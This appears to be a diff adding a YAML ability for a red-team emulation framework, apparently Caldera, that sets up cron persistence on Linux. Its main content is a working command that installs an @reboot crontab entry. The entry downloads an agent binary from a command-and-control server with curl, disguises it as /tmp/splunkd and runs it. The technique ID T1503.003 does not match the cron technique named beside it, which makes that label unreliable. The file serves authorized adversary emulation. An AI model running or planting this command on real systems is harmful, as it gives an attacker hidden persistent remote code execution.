@@ -1,0 +1,38 @@
+- technique_name: 'Scheduled Task/Job: Cron'
+  plugin: ''
+  repeatable: false
+  technique_id: T1503.003
+  singleton: true
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  tactic: persistence
+  privilege: ''
+  name: Create cronjob for current user
+  requirements: []
+  access: {}
+  executors:
+  - parsers: []
+    timeout: 60
+    language: null
+    payloads: []
+    build_target: null
+    command: if crontab -l &> /dev/null; then (crontab -l; echo '@reboot sleep 180
+      && server="http://#{caldera.server}:8888";curl -s -X POST -H "file:sandcat.go"
+      -H "platform:linux" $server/file/download > /tmp/splunkd;chmod +x /tmp/splunkd;/tmp/./splunkd
+      -server $server -group red -v') | crontab -; else echo '@reboot sleep 180 &&
+      server="http://#{caldera.server}:8888";curl -s -X POST -H "file:sandcat.go"
+      -H "platform:linux" $server/file/download > /tmp/splunkd;chmod +x /tmp/splunkd;/tmp/./splunkd
+      -server $server -group red -v' | crontab -; fi
+    code: null
+    additional_info: {}
+    variations: []
+    name: sh
+    cleanup:
+    - (crontab -l | grep -v '@reboot sleep 180 && server="http://#{caldera.server}:8888"')
+      | crontab - && rm /tmp/splunkd
+    uploads: []
+    platform: linux
+  description: Create a cronjob for the current user
+  delete_payload: true
+  id: 831d5b9d-7867-4bca-98f5-bc235445614c
